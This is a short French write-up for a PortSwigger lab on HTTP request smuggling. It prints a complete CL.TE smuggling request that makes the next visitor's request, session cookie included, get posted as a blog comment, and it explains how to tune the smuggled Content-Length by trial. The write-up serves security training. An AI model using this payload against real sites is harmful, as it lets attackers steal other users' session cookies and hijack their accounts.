# Lab

https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

## Solution

Sur ce lab, les requêtes de la home page peuvent être smugglé.

On a la possibilité de posté des commentaire.

L'objectif de ce lab est de smuggler une requête de post de commentaire, lorsqu'un utilisateur visitera le sote, il exécutera à son insu la requête smuggled.

La requête va poster les headers de la requête smuggled + les siens (dont les cookies) :

```http
POST / HTTP/1.1
Host: 0a21004b04ee77e284e2272e001e000f.web-security-academy.net
Cookie: session=EciXHCiFoNckVKBocaxsPLjUZwgtEa2U
Content-Length: 264
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Cookie: session=EciXHCiFoNckVKBocaxsPLjUZwgtEa2U
Content-Length: 900
Content-Type: application/x-www-form-urlencoded

csrf=lZS51389g8urYR6tNDJVAuoE0FMKPKNu&postId=6&name=My+name&email=my-email%40email.com&website=&comment=
```

Pour que cette attaque fonctionne, il faut adapter le `Content-Length` de la requête smuggled.

Si le `Content-Length` est trop petit, la requête smuggled sera tronquée.

Si le `Content-Length` est trop grand, la requête smuggled résultera en time-out et ne sera pas exécutée.

Pour déterminer la bonne valeur du `Content-Length`, on a pas le choix que de le faire de façon empirique et de tester notre payload sur nous même.